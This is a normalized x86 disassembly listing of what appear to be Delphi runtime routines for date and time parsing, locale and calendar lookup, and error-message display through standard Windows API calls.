jne r-xdata
push ebp
call sub_409c18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409a28
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b80
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409b80
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c448
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409f00
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409b3c
pop ecx
jmp r-xdata
push ebp
call sub_409c18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409a28
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409b80
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4087e4
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_4087e4
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_4087e4
test eax eax
jne r-xdata
jmp r-xdata
sub_40a6b4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409f00
pop ecx
push ebp
mov eax ebx
call sub_409f00
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_404010
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a73c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_4041e0
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a760
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a73c
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_4041e0
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a7f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a86d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a874
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a73c
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_4041e0
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404440
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407ee4
test eax eax
jne r-xdata
mov eax edi
call sub_4041e0
add [ esi ] eax
mov bl 0x1
sub_40a880
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a73c
mov eax esi
call sub_4041e0
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a8b8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_4041e0
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a904
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_4041e0
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c48c
mov [ ebx ] eax
jmp r-xdata
sub_40a94c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4043e0
push eax
mov eax [ ebx ]
call sub_4043e0
pop edx
call sub_40c58c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a9a0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409b28
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a9fc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ad17
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a8b8
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c4c8
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a760
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a904
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404440
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407f54
mov eax [ ebp - 0x1c ]
call sub_40a94c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad1e
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f44
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a880
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a760
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a880
test al al
je r-xdata
call sub_409b28
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a760
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409714
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404524
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a880
mov edx ebx
mov eax esi
call sub_40a73c
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_4041e0
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a904
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a9a0
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a73c
mov eax esi
call sub_4041e0
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409b28
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_4041e0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404440
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407ee4
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_4041e0
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404440
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407ee4
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ad40
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7f4
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7f4
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7f4
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a760
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a73c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7f4
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a880
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a760
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7f4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a880
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a73c
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_4095cc
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7f4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a760
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a7f4
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a880
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a7f4
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a760
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40af34
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a9fc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041e0
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af68
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ad40
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4041e0
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af9c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_40afd0
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0xb
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407c5c
sub_40afd0
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a9fc
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40af68
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4041e0
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ad40
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40b05c
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404010
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b0a8
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f74
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404010
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b0f4
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b11c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b0a8
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405c50
sub_40b158
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b26b
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b11c
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f74
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b11c
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f74
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b11c
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f74
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b11c
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f74
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b272
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f44
retn
sub_40b27c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404118
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b2b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b31d
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404118
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4081cc
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b324
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
inc ebx
sub_40b330
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b3c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b0a8
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4081cc
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b3ce
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b27c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b2b8
call EnumCalendarInfoA
sub_40b3e0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b5aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f20
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b0a8
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4081cc
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4041e0
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b5b1
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403f44
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4087e4
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c450
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404440
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4041e8
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403f74
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_4087e4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041e8
inc ebx
jmp r-xdata
mov eax esi
call sub_4041e0
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_4087e4
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4041e8
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041e8
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_4041e8
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404108
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4041e8
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404108
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4041e8
sub_40b614
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b608
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c62c
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408708
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051bc
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4030e0
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408d2c
mov eax [ ebp - 0x4 ]
call sub_4086a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4043e0
mov ebx eax
mov eax ebx
call sub_4086a4
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b79c
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b614
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4051bc
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_4029f4
call sub_402844
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4086a4
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b864
push ebx
push esi
push edi
test dl dl
je r-xdata
